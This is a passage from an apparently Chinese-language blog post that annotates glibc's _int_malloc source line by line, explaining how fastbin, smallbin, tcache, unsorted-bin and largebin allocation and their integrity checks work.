class="keyword">int</span> idx;                 <span class="comment">/* associated bin index */</span></span><br><span class="line">  mbinptr bin;                      <span class="comment">/* associated bin */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr victim;                 <span class="comment">/* inspected/selected chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T size;             <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> victim_index;                 <span class="comment">/* its bin index */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr remainder;              <span class="comment">/* remainder from a split */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> remainder_size;     <span class="comment">/* its size */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> block;               <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> bit;                 <span class="comment">/* bit map traverser */</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">map</span>;                 <span class="comment">/* current word of binmap */</span></span><br><span class="line"></span><br><span class="line">  mchunkptr fwd;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr bck;                    <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="keyword">size_t</span> tcache_unsorted_count;	    <span class="comment">/* count of unsorted chunks processed */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">---------------------------------------------定义相关变量------------------------------</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Convert request size to internal form by adding SIZE_SZ bytes</span></span><br><span class="line"><span class="comment">     overhead plus possibly more to obtain necessary alignment and/or</span></span><br><span class="line"><span class="comment">     to obtain a size of at least MINSIZE, the smallest allocatable</span></span><br><span class="line"><span class="comment">     size. Also, checked_request2size traps (returning 0) request sizes</span></span><br><span class="line"><span class="comment">     that are so large that they wrap around zero when padded and</span></span><br><span class="line"><span class="comment">     aligned.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  checked_request2size (bytes, nb);<span class="comment">//checked_request2size()函数将需要分配的内存大小bytes转换为需要分配的chunk大小nb，Ptmalloc内部分配都是以chunk为单位，根据chunk的大小，决定如何获得满足条件的chunk。，比如说需要对齐、还有控制最小大小</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* There are no usable arenas.  Fall back to sysmalloc to get a chunk from</span></span><br><span class="line"><span class="comment">     mmap.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (av == <span class="literal">NULL</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc (nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">	alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">------------------------------------检查arena，如果没有可用的arena或者arena的内存不足，那么就通过系统调用mmap去申请一块内存，并返回。</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If the size qualifies as a fastbin, first check corresponding bin.</span></span><br><span class="line"><span class="comment">     This code is safe to execute even if av is not yet initialized, so we</span></span><br><span class="line"><span class="comment">     can try it without checking, which saves some time on this fast path.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REMOVE_FB(fb, victim, pp)			\</span></span><br><span class="line">  <span class="keyword">do</span>							\</span><br><span class="line">    &#123;							\</span><br><span class="line">      victim = pp;					\</span><br><span class="line">      <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)				\</span><br><span class="line">	<span class="keyword">break</span>;						\</span><br><span class="line">    &#125;							\</span><br><span class="line">  <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim)) \</span><br><span class="line">	 != victim);					\</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (get_max_fast ()))<span class="comment">//判断malloc大小是否属于fastbin范围内</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = fastbin_index (nb);<span class="comment">//取到fastbin的起始头索引号</span></span><br><span class="line">      mfastbinptr *fb = &amp;fastbin (av, idx);<span class="comment">//取到堆块，去fastbin这个空闲链表中取</span></span><br><span class="line">      mchunkptr pp;</span><br><span class="line">      victim = *fb;<span class="comment">//将堆块赋值给victim</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (victim != <span class="literal">NULL</span>)<span class="comment">//对上一步得到的堆块做一系列检查，函数无返回</span></span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">	    *fb = victim-&gt;fd;</span><br><span class="line">	  <span class="keyword">else</span></span><br><span class="line">	    REMOVE_FB (fb, pp, victim);</span><br><span class="line">	  <span class="keyword">if</span> (__glibc_likely (victim != <span class="literal">NULL</span>))</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="keyword">size_t</span> victim_idx = fastbin_index (chunksize (victim));</span><br><span class="line">	      <span class="keyword">if</span> (__builtin_expect (victim_idx != idx, <span class="number">0</span>))</span><br><span class="line">		malloc_printerr (<span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>);</span><br><span class="line">	      check_remalloced_chunk (av, victim, nb);<span class="comment">//检测freechunk的size最低位为1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">		 stash them in the tcache.当我们在这里的时候，如果我们看到其他同样大小的块，把他们藏在 tcache 中。*/</span></span><br><span class="line">	      <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">	      <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">		&#123;</span><br><span class="line">		  mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">		  <span class="comment">/* While bin not empty and tcache not full, copy chunks.  */</span></span><br><span class="line">		  <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">			 &amp;&amp; (tc_victim = *fb) != <span class="literal">NULL</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="keyword">if</span> (SINGLE_THREAD_P)</span><br><span class="line">			*fb = tc_victim-&gt;fd;</span><br><span class="line">		      <span class="keyword">else</span></span><br><span class="line">			&#123;</span><br><span class="line">			  REMOVE_FB (fb, pp, tc_victim);</span><br><span class="line">			  <span class="keyword">if</span> (__glibc_unlikely (tc_victim == <span class="literal">NULL</span>))</span><br><span class="line">			    <span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		      tcache_put (tc_victim, tc_idx);<span class="comment">//如果tachebin没满，把fastbin中的堆块循环放入tcachebin中</span></span><br><span class="line">		    &#125;</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	      <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">	      alloc_perturb (p, bytes);</span><br><span class="line">	      <span class="keyword">return</span> p;<span class="comment">//最后将最早的fastbin的第一个节点返回给用户</span></span><br><span class="line">	    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">     hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">     (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">     processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">     anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (in_smallbin_range (nb))<span class="comment">//如果申请的chunk大小在smallbin的范围内</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = smallbin_index (nb);<span class="comment">//取到smallbin的链头</span></span><br><span class="line">      bin = bin_at (av, idx);<span class="comment">//smallbin尾部</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> ((victim = last (bin)) != bin)<span class="comment">//判断当前的bin链是否为空</span></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">          last宏：因为smallbin是双向链表结构，采取FIFO（先进先出）存取chunk，所以使用last返回双向链表中的最先free进去的节点。if中判断如果双链表中的最后一个不是头，那么说明链表不为空</span></span><br><span class="line"><span class="comment">          简而言之就是取索引对应的smallbin中最后一个chunk</span></span><br><span class="line"><span class="comment">          */</span></span><br><span class="line">          </span><br><span class="line">          </span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;<span class="comment">//获取倒数第二个chunk</span></span><br><span class="line">          </span><br><span class="line">	  <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<span class="comment">//取走之前进行系统检测，检查双向链表完整性</span></span><br><span class="line">	    malloc_printerr (<span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class="line">          set_inuse_bit_at_offset (victim, nb);<span class="comment">//如果当前chunk被malloc使用后，那么当前chunk的后面两个chunk的previnuse都设置为1.</span></span><br><span class="line">          </span><br><span class="line">          bin-&gt;bk = bck;<span class="comment">//将victim从smallbin的链表中卸下</span></span><br><span class="line">          bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">	    set_non_main_arena (victim);</span><br><span class="line">          check_malloced_chunk (av, victim, nb);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">	     stash them in the tcache.  */</span></span><br><span class="line">	  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);<span class="comment">//获取对应size的tcache索引</span></span><br><span class="line">	  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">	    &#123;</span><br><span class="line">	      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">	      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">		     &amp;&amp; (tc_victim = last (bin)) != bin)<span class="comment">//当tcachebin不为空，且没满，smallbin不为空，则依次取最后一个chunk插入到tcachebin里</span></span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      bck = tc_victim-&gt;bk;</span><br><span class="line">		      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class="line">		      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">			set_non_main_arena (tc_victim);</span><br><span class="line">		      bin-&gt;bk = bck;<span class="comment">//将当前chunk从smallbin里卸下</span></span><br><span class="line">		      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">		      tcache_put (tc_victim, tc_idx);<span class="comment">//放进tcachebin中</span></span><br><span class="line">	            &#125;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">          <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">          alloc_perturb (p, bytes);</span><br><span class="line">          <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//和fastbin相同，如果tcachebin不满则把smallbin中的chunk放入tcachebin中，然后返回smallbin的第一个节点。</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If this is a large request, consolidate fastbins before continuing.</span></span><br><span class="line"><span class="comment">     While it might look excessive to kill all fastbins before</span></span><br><span class="line"><span class="comment">     even seeing if there is space available, this avoids</span></span><br><span class="line"><span class="comment">     fragmentation problems normally associated with fastbins.</span></span><br><span class="line"><span class="comment">     Also, in practice, programs tend to have runs of either small or</span></span><br><span class="line"><span class="comment">     large requests, but less often mixtures, so consolidation is not</span></span><br><span class="line"><span class="comment">     invoked all that often in most programs. And the programs that</span></span><br><span class="line"><span class="comment">     it is called frequently in otherwise tend to fragment.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="comment">//如果申请的chunk大小既不是tcache、fastbin、smallbin，此时执行malloc_consolidate()----作用是进行碎片整理，但是没有对freechunk切割使用</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    何为consolidate</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    我们知道大于0x80的chunk被释放之后就放到了unsortedbin上面去，但是unsortedbin是一个未分类的bin，上面的chunk也处于未分类的状态。但是这些chunk需要在特定的条件下被整理然后放入到smallbins或者largebins中。</span></span><br><span class="line"><span class="comment">    这个整理的过程被称为unsortedbin的“consolidate”，但是“consolidate”是要在特定的条件下才会发生的，并且与malloc紧密相关。</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    其触发情景：</span></span><br><span class="line"><span class="comment">    一：当我们malloc一个chunk，这个chunk的大小大于smallbin的范围，在unsortedbin中寻找可用的freechunk使用时，会触发malloc_conlolidate</span></span><br><span class="line"><span class="comment">    二：发现unsortedbin中有大的freechunk可以切割给malloc使用时，切割unsortedbin，产生last remainder的时候会consolidate，见文章：https://blog.csdn.net/qq_41453285/article/details/97803141（此种情况不同于情景一，不需要考虑malloc的大小）。</span></span><br><span class="line"><span class="comment">    三malloc时如果bin链中没有可以使用的freechunk，并且去切割topchunk，发现topchunk也不够用，此时回去再去调用malloc_consolidate进行一次整理。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      idx = largebin_index (nb);</span><br><span class="line">      <span class="keyword">if</span> (atomic_load_relaxed (&amp;av-&gt;have_fastchunks))<span class="comment">//判断fastbin中是否有空闲块，有则调用malloc_consolidate（）将其合并放入到unsortedbin中</span></span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     Process recently freed or remaindered chunks, taking one only if</span></span><br><span class="line"><span class="comment">     it is exact fit, or, if this a small request, the chunk is remainder from</span></span><br><span class="line"><span class="comment">     the most recent non-exact fit.  Place other traversed chunks in</span></span><br><span class="line"><span class="comment">     bins.  Note that this step is the only place in any routine where</span></span><br><span class="line"><span class="comment">     chunks are placed in bins.</span></span><br><span class="line"><span class="comment">     The outer loop here is needed because we might not realize until</span></span><br><span class="line"><span class="comment">     near the end of malloc that we should have consolidated, so must</span></span><br><span class="line"><span class="comment">     do so and retry. This happens at most once, and only when we would</span></span><br><span class="line"><span class="comment">     otherwise need to expand memory to service a &quot;small&quot; request.</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  INTERNAL_SIZE_T tcache_nb = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    tcache_nb = nb;</span><br><span class="line">  <span class="keyword">int</span> return_cached = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  tcache_unsorted_count = <span class="number">0</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;; )<span class="comment">//for大循环</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">int</span> iters = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))</span><br><span class="line">        &#123;</span><br><span class="line">          bck = victim-&gt;bk;</span><br><span class="line">          size = chunksize (victim);</span><br><span class="line">          mchunkptr next = chunk_at_offset (victim, size);</span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (size &lt;= <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (chunksize_nomask (next) &lt; <span class="number">2</span> * SIZE_SZ)</span><br><span class="line">              || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): mismatching next-&gt;prev_size (unsorted)&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">              || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): unsorted double linked list corrupted&quot;</span>);</span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;</span>);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/*</span></span><br><span class="line"><span class="comment">             If a small request, try to use last remainder if it is the</span></span><br><span class="line"><span class="comment">             only chunk in unsorted bin.  This helps promote locality for</span></span><br><span class="line"><span class="comment">             runs of consecutive small requests. This is the only</span></span><br><span class="line"><span class="comment">             exception to best-fit, and applies only when there is</span></span><br><span class="line"><span class="comment">             no exact fit for a small chunk.</span></span><br><span class="line"><span class="comment">           */</span></span><br><span class="line">---------------下面是重新申请smallchunk的过程</span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">              (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &gt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb + MINSIZE))</span><br><span class="line">            &#123;</span><br><span class="line">              <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              remainder = chunk_at_offset (victim, nb);</span><br><span class="line">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">              av-&gt;last_remainder = remainder;</span><br><span class="line">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">              <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                  remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                  remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">              set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">              set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* remove from unsorted list */</span></span><br><span class="line">          <span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">            malloc_printerr (<span class="string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>); </span><br><span class="line">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* Take now instead of binning if exact fit */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (size == nb)</span><br><span class="line">            &#123;</span><br><span class="line">              set_inuse_bit_at_offset (victim, size);</span><br><span class="line">              <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		set_non_main_arena (victim);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">	      <span class="comment">/* Fill cache first, return to user only if cache fills.</span></span><br><span class="line"><span class="comment">		 We may return one of these chunks later.  */</span></span><br><span class="line">	      <span class="keyword">if</span> (tcache_nb</span><br><span class="line">		  &amp;&amp; tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count)</span><br><span class="line">		&#123;</span><br><span class="line">		  tcache_put (victim, tc_idx);</span><br><span class="line">		  return_cached = <span class="number">1</span>;</span><br><span class="line">		  <span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	      <span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">              check_malloced_chunk (av, victim, nb);</span><br><span class="line">              <span class="keyword">void</span> *p = chunk2mem (victim);</span><br><span class="line">              alloc_perturb (p, bytes);</span><br><span class="line">              <span class="keyword">return</span> p;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* place chunk in bin */</span></span><br><span class="line"></span><br><span class="line">          <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = smallbin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line">            &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">              victim_index = largebin_index (size);</span><br><span class="line">              bck = bin_at (av, victim_index);</span><br><span class="line">              fwd = bck-&gt;fd;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">              <span class="keyword">if</span> (fwd != bck)</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">                  size |= PREV_INUSE;</span><br><span class="line">                  <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">                  assert (chunk_main_arena (bck-&gt;bk));</span><br><span class="line">                  <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size)</span><br><span class="line">		      &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))</span><br><span class="line">                    &#123;</span><br><span class="line">                      fwd = bck;</span><br><span class="line">                      bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                      victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    &#125;</span><br><span class="line">                  <span class="keyword">else</span></span><br><span class="line">                    &#123;</span><br><span class="line">                      assert (chunk_main_arena (fwd));</span><br><span class="line">                      <span class="keyword">while</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                        &#123;</span><br><span class="line">                          fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">			  assert (chunk_main_arena (fwd));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                      <span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) size</span><br><span class="line">			  == (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                        <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                        fwd = fwd-&gt;fd;</span><br><span class="line">                      <span class="keyword">else</span></span><br><span class="line">                        &#123;</span><br><span class="line">                          victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                          fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                        &#125;</span><br><span class="line">                      bck = fwd-&gt;bk;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If we&#x27;ve processed as many chunks as we&#x27;re allowed while</span></span><br><span class="line"><span class="comment">	 filling the cache, return one of the cached ones.  */</span></span><br><span class="line">      ++tcache_unsorted_count;</span><br><span class="line">      <span class="keyword">if</span> (return_cached</span><br><span class="line">	  &amp;&amp; mp_.tcache_unsorted_limit &gt; <span class="number">0</span></span><br><span class="line">	  &amp;&amp; tcache_unsorted_count &gt; mp_.tcache_unsorted_limit)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">          <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">      <span class="comment">/* If all the small chunks we found ended up cached, return one now.  */</span></span><br><span class="line">      <span class="keyword">if</span> (return_cached)</span><br><span class="line">	&#123;</span><br><span class="line">	  <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">         If a large request, scan through the chunks of current bin in</span></span><br><span class="line"><span class="comment">         sorted order to find smallest that fits.  Use the skip list for this.</span></span><br><span class="line"><span class="comment">       */</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">      经过前面一系列的执行，如果fastbins、smallbins、unsortedbin中的chunk都不符合malloc的要求，接下来就是判断malloc的chunk是否为largebin，并在largebins中找chunk来使用了。</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">        &#123;</span><br><span class="line">          bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">          <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">          <span class="keyword">if</span> ((victim = first (bin)) != bin</span><br><span class="line">	      &amp;&amp; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (victim)</span><br><span class="line">	        &gt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb))</span><br><span class="line">            &#123;</span><br><span class="line">              victim = victim-&gt;bk_nextsize;</span><br><span class="line">              <span class="keyword">while</span> (((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                      (<span class="keyword">unsigned</span> <span class="keyword">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">              <span class="keyword">if</span> (victim != last (bin)</span><br><span class="line">		  &amp;&amp; chunksize_nomask (victim)</span><br><span class="line">		    == chunksize_nomask (victim-&gt;fd))</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">              remainder_size = size - nb;</span><br><span class="line">              unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">              <span class="comment">/* Exhaust */</span></span><br><span class="line">              <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">                &#123;</span><br><span class="line">                  set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                  <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">		    set_non_main_arena (victim);</span><br><span class="line">                &#125;</span><br><span class="line">              <span class="comment">/* Split */</span></span><br><span class="line">              <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                  remainder = 